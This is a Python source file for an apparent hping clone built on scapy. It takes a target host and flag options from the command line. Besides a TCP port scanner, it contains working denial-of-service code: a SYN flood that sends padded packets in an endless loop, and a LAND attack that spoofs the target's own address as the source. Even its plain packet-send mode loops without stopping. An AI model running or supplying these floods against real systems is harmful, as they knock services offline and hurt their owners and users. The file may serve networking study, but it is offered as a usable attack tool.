import getopt
from scapy.layers.inet import TCP, IP, Ether, ICMP
from scapy.all import Raw, send
from scapy.sendrecv import sr1
from scapy.volatile import RandShort, RandNum
import sys
import random
import socket

# --Globals--
flood = False
scan = False
land = False
flags = []
ports = "0"
target = ""

def main():
    if scan:
        port_scan()
    elif flood:
        syn_flood()
    elif land:
        land_attack()
    else:
        send_packet()

def send_packet():
    attack_flags = "".join(i for i in flags)
    print(f"HPING {target}: {attack_flags} set, 40 headers + 1 data bytes")
    destination_port = parse_ports(ports)
    packets = []
    packet = IP(dst=target, ttl=64)/\
             TCP(sport=RandShort(), flags=attack_flags, dport=destination_port, seq=random.randint(200000000, 500000000))
    for i in range(200):
        packets.append(packet)
    send(packets, loop=1, verbose=0)
    print("\n")


def land_attack():
    print("Land Attack....")
    attack_flags = "".join(i for i in flags)
    print(f"HPING {target}: {attack_flags} set, 40 headers + 1 data bytes")
    # Land attack
    destination_port = parse_ports(ports)
    send(IP(dst=target, src=target, ttl=64)
         / TCP(sport=destination_port, flags=attack_flags, dport=destination_port, seq=random.randint(200000000,500000000))
         / Raw(b"X"*1024), loop=1, verbose=0)
    print("\n")


def syn_flood():
    attack_flags = "".join(i for i in flags)
    destination_port = parse_ports(ports)
    print(f"HPING {target}: {attack_flags} set, 40 headers + 1 data bytes")
    print("In flood mode, no replies will be shown")
    # Send packet in loop until ctrl+c is pressed
    send(IP(dst=target, ttl=64)
         / TCP(sport=RandNum(1025, 65534), flags=attack_flags, dport=destination_port, seq=random.randint(200000000, 500000000))
         / Raw(b"X"*1024), loop=1, verbose=0)
    print("\n")


def get_service(port):
    try:
        return socket.getservbyport(port)
    except OSError:
        return "\t"


def port_scan():
    attack_flags = "".join(i for i in flags)
    destination_port = parse_ports(ports)
    no_response = []
    print(f"{len(destination_port)} ports to scan!");
    print("+----+-----------+---------+---+-----+-----+-----+");
    print("|port| serv name |  flags  |ttl| id  | win | len |");
    print("+----+-----------+---------+---+-----+-----+-----+");
    for port in destination_port:
        scan_response = sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags=attack_flags), verbose=0)
        if scan_response is not None:
            if scan_response.haslayer(TCP):
                if scan_response[TCP].flags == 18:
                    # Service running
                    service = get_service(port)
                    print(f"{port}\t{service}\t{scan_response[TCP].flags}\t{scan_response[IP].ttl}\t{scan_response[IP].id}\t{scan_response[TCP].window}\t{scan_response[IP].len}\n")
                elif scan_response[TCP].flags == 20:
                    # No service running
                    continue
            elif scan_response.haslayer(ICMP):
                if scan_response[ICMP].type == 3 and scan_response[ICMP].code in [1, 2, 3, 9, 10, 13]:
                    # Silently dropped by firewall
                    continue
        else:
            no_response.append(port)
    if len(no_response) > 0:
        print(f"No response from {len(no_response)} ports")



def parse_ports(ports):
    flag = False
    for i in ports:
        # if string has letter
        if i.isalpha():
            flag = True
    if flag:
        print("Port argument must be: \"port-port\", \"port,port,port\", or \"port\"")
        sys.exit()
    if "-" in ports and "," in ports:
        print("Port argument must be: \"port-port\", \"port,port,port\", or \"port\"")
        sys.exit()
    elif "-" in ports:
        return [int(i) for i in range(int(ports.split("-")[0]), int(ports.split("-")[1])+1)]
    elif "," in ports:
        return [int(i) for i in ports.split(",")]
    else:
        return int(ports)


def usage():
    txt = """\nWelcome! Usage can be seen below. If you
wish stop a request, press ctrl + c"""
    print(txt)
    print("-------------------------------------------\n")
    print("usage: python main.py host [options]")
    print("-h  --help   show this help")
    print("    --flood  sent packets as fast as possible. Don't show replies.")
    print("-S  --syn    set syn flag")
    print("-p  --destport   specify destination port")
    print("-8  --scan   specify destination port range")
    print("-F  --fin   Set FIN flag")
    print("-P  --push   Set PUSH flag")
    print("-U  --urg  Set URG flag")
    print("-a         LAND attack")


def process_args():
    global flood, target, scan, ports, flags, land
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ha8:SFPUp:", ["help", "flood", "syn", "fin", "push", "urg", "destport=", "scan="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err)  # will print something like "option -a not recognized"
        sys.exit(2)
    for option, argument in opts:
        if option in ("-h", "--help"):
            usage()
        elif option == "--flood":
            flood = True
        elif option == "-a":
            land = True
        elif option in ("-S", "--syn"):
            flags.append("S")
        elif option in ("-F", "--fin"):
            flags.append("F")
        elif option in ("-P", "--push"):
            flags.append("P")
        elif option in ("-U", "--urg"):
            flags.append("U")
        elif option in ("-p", "--destport"):
            ports = argument
        elif option in ("-8", "--scan"):
            scan = True
            ports = argument
        else:
            assert False, "unhandled option"
    if len(args) != 1:
        print(args)
        print("Must specify a single host after the options!")
        sys.exit(1)
    else:
        target = args[0]

if __name__ == "__main__":
    process_args()
    main()




